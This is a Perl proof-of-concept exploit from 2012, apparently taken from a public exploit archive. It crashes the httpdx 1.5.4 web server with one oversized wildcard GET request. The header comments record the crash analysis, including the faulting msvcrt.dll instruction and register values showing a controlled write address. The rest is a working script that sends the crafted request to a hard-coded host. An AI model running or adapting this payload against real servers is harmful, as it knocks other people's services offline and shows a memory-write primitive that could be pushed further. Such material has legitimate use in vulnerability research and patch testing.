#!/usr/bin/perl -w
#======================================================================
# Exploit Title: httpdx v1.5.4 Remote HTTP Server DoS (using wildcards)
# Date: 18 July 2012
# Exploit Author: st3n [at sign] funoverip [dot] net
# Vendor Homepage: http://httpdx.sourceforge.net
# Download link: http://sourceforge.net/projects/httpdx/files/httpdx/httpdx%201.5.4/httpdx1.5.4.zip/download
# Version: 1.5.4
# Tested on: WinXP SP3
#======================================================================
# Additional notes:
#   - One request is enough
#   - On crash: Access violation when writing to [41414141]
#   - The value x01 is written to [EDI] at the following instruction
#     MOV BYTE PTR DS:[EDI],AL
#
# In msvcrt.dll
# -------------
#
#  77C470D0   8A06             MOV AL,BYTE PTR DS:[ESI]
#  77C470D2   8807             MOV BYTE PTR DS:[EDI],AL      <===== HERE
#  77C470D4   8B45 08          MOV EAX,DWORD PTR SS:[EBP+8]
#  77C470D7   5E               POP ESI
#  77C470D8   5F               POP EDI
#  77C470D9   C9               LEAVE
#  77C470DA   C3               RETN
#
# Registers
# -------------
#
#  EAX 41414101
#  ECX FFFFFFFD
#  EDX 00000003
#  EBX 00423001 ASCII "&>"
#  ESP 01058B9C
#  EBP 01058BA4
#  ESI 003EA2E0
#  EDI 41414141        <============= HERE
#  EIP 77C470D2 msvcrt.77C470D2
#
# Crash output :
# --------------
#   httpdx 1.5.4 - Started
#
#   [http/ftp]://192.168.0.10/
#
#   ffs wtf happened?
#
#======================================================================
 
 
#======================================================================
# PoC code
#======================================================================
use strict;
use IO::Socket::INET;
 
my $host = "192.168.0.10";
my $sock = IO::Socket::INET->new("$host:80");
 
# EDI addr
my $EDI =
    "\x7A" .  # = 0x41 + 0x39
    "\x32" .  # = 0x41 - 0x0F
    "\x41" .
    "\x41" ;
 
print $sock     "GET /" . "*" x 2450 .
        "A"  x 12 .
        $EDI .
        "C" x 528 . " HTTP/1.0\r\n" .
        "Host: $host" . "\r\n\r\n" ;
 
exit;
